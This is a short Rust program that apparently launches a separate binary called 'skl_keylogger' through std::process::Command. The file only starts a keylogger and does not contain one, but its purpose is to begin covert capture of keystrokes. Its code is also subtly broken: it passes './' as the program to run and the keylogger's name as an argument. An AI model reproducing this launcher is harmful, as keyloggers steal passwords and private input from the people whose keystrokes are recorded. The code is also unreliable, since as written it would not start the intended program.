use std::process::Command;

fn main() {
    Command::new("./")
        .args(["skl_keylogger"])
        .status()
        .expect("Error when start");
}


